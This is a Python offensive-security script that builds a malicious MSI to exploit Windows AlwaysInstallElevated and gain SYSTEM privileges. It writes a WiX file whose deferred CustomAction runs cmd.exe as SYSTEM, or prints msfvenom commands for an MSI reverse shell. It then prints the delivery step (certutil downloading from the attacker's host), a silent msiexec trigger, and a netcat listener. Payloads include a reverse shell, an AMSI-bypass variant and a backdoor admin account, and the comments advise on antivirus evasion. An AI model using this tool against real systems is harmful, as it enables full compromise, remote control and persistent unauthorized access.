#!/usr/bin/env python3
"""AlwaysInstallElevated privesc -> MSI that runs your action AS SYSTEM.

When BOTH of these registry values are 1, ANY user's `msiexec /i` install runs as SYSTEM:
  HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer  AlwaysInstallElevated = 1
  HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer  AlwaysInstallElevated = 1
Build a malicious MSI whose install-sequence CustomAction fires your command in the SYSTEM
context, ship it, and run `msiexec /quiet /qn /i evil.msi`.

Two backends (NOTE: BOTH are AV-flagged — an AlwaysInstallElevated MSI that runs a command via a
CustomAction matches malicious-MSI heuristics. ClamAV flags the wixl MSI as Emotet and msfvenom as
MSShellcode. Prefer the NATIVE-exe routes (service/DLL/Potato) — those clear the static floor; use the
MSI route only when AlwaysInstallElevated is your only path, and expect Defender/Trellix to see it):
  --backend wixl      (DEFAULT) self-built, self-contained; still flagged, but less heavily than msfvenom.
  --backend msfvenom  `msfvenom ... -f msi` — MSShellcode signature, more heavily flagged; lab-only.

PRINTS the build line + delivery + the target-side trigger. Edit LHOST/LPORT in _winpriv_common.py.

Usage:
  python3 gen_msi.py [--action revshell|revshell_amsi|add_admin|add_admin_domain] [--backend wixl|msfvenom] [--name evil.msi] [--arch x64|x86]

Confirm the vector first (from your foothold):
  reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
  reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
  (BOTH must read 0x1 — one alone does nothing.)
"""
import sys
import _winpriv_common as P

def die(m): print(m); sys.exit(1)
def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

def _xesc(s):                    # escape for an XML attribute value (ExeCommand="...")
    return (s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
             .replace('"', "&quot;").replace("'", "&apos;"))

def _shq(s):                     # single-quote for a Linux shell arg (the printed msfvenom CMD=)
    return "'" + s.replace("'", "'\\''") + "'"

action  = opt("--action", "revshell")
backend = opt("--backend", "wixl")     # DEFAULT wixl: less-flagged than msfvenom, but STILL AV-flagged (see docstring).
name    = opt("--name", "evil.msi")
arch    = opt("--arch", "x64")
revtype = opt("--revtype", None)                   # powershell|nc
stage   = opt("--stagedir", P.STAGE).rstrip("\\")  # noexec/monitored Temp? override
if action not in P.win_actions(): die(f"unknown action '{action}'. pick: {', '.join(P.win_actions())}")
cmd = P.win_actions(revtype)[action]               # the raw command; add_admin uses '&' so wrap in cmd /c
exe_cmd = "cmd.exe /c " + cmd

print(f"# AlwaysInstallElevated MSI   action={action}   backend={backend}   arch={arch}")
print(f"# 0) confirm BOTH keys are 0x1:")
print(f"#    reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated")
print(f"#    reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n")

if backend == "wixl":
    # wixl CustomAction has no Directory attr — use the type-50 form: Property = the exe PATH
    # (cmd.exe), ExeCommand = the args. Execute=deferred + Impersonate=no => runs in msiexec's
    # SYSTEM context, which is what AlwaysInstallElevated grants for the whole install.
    # Return=ignore so the payload firing doesn't abort as a "failed" install.
    args = "/c " + cmd
    wxs = name.rsplit(".", 1)[0] + ".wxs"
    xml = f"""<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" Name="Update" Language="1033" Version="1.0.0.0" Manufacturer="MS"
           UpgradeCode="9E4F8B10-2C7D-4A1E-9B3F-77AA1234BEEF">
    <Package InstallerVersion="200" Compressed="yes" InstallScope="perMachine"/>
    <Media Id="1" Cabinet="p.cab" EmbedCab="yes"/>
    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder"><Directory Id="AppDir" Name="Update"/></Directory>
    </Directory>
    <Feature Id="F" Level="1"/>
    <!-- Property holds the executable path; ExeCommand holds its args (CustomAction type 50). -->
    <Property Id="ShellExe" Value="C:\\Windows\\System32\\cmd.exe"/>
    <!-- runs AS SYSTEM during install (deferred, no impersonation): -->
    <CustomAction Id="Pwn" Property="ShellExe"
                  ExeCommand="{_xesc(args)}"
                  Execute="deferred" Impersonate="no" Return="ignore"/>
    <!-- explicit sequence 6500: after InstallInitialize (1500), before InstallFinalize (6600),
         so the deferred script actually runs it elevated. wixl does NOT resolve Before=. -->
    <InstallExecuteSequence>
      <Custom Action="Pwn" Sequence="6500"/>
    </InstallExecuteSequence>
  </Product>
</Wix>
"""
    open(wxs, "w").write(xml)
    print(f"# wrote {wxs}   (CustomAction runs AS SYSTEM: cmd.exe {args})")
    print(f"# 1) build the MSI on the attacker (wixl):")
    print(f"wixl -o {name} {wxs}")

elif backend == "msfvenom":
    a = "x64" if arch == "x64" else "x86"
    print(f"# !! AV WARNING: msfvenom MSI output is HEAVILY signatured — likely quarantined on a monitored host.")
    print(f"#    Prefer --backend wixl (default) on any box with AV. Use msfvenom only in a known-clean lab.")
    print(f"# 1) build the MSI on the attacker (msfvenom exec payload runs your command during install):")
    print(f"msfvenom -p windows/{a}/exec CMD={_shq(exe_cmd)} EXITFUNC=thread -f msi -o {name}")
    print(f"#    (alt: a direct MSI revshell — no _winpriv_common action needed:")
    print(f"#     msfvenom -p windows/{a}/shell_reverse_tcp LHOST={P.LHOST} LPORT={P.LPORT} -f msi -o {name} ; then nc -lvnp {P.LPORT})")
else:
    die("backend must be 'wixl' or 'msfvenom'")

print(f"\n# 2) deliver {name} to the target:")
print(f'certutil -urlcache -f http://{P.LHOST}/{name} "{stage}\\{name}"   REM serve: python3 -m http.server 80')
print(f"\n# 3) trigger — install it; AlwaysInstallElevated runs it AS SYSTEM:")
print(f"msiexec /quiet /qn /i {stage}\\{name}")
if action in ("revshell", "revshell_amsi"):
    print(f"\n# start `nc -lvnp {P.LPORT}` on the attacker first  (SYSTEM shell to {P.LHOST}:{P.LPORT}).")
elif action == "add_admin":
    print(f"\n# creates LOCAL admin {P.ADMIN_USER}:{P.ADMIN_PASS}.")
print(f"# cleanup:  del {stage}\\{name}")
